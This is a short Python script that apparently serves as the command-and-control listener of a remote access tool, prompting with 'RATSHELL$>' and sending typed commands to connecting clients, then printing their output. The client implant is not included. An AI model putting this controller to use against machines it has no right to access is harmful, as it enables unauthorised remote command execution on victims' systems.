import socket             

PORT = 555  
class Server:
    def __init__(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)         
        self.s.bind(('', PORT))         
        self.s.listen(5)     
    def run(self):
        while True: 

            c, addr = self.s.accept()  
            cm=input("RATSHELL$>")   
            c.send(cm.encode())
            if cm=="exit":
                break
            res=c.recv(8192).decode()
            print(res)
server=Server()
server.run()
    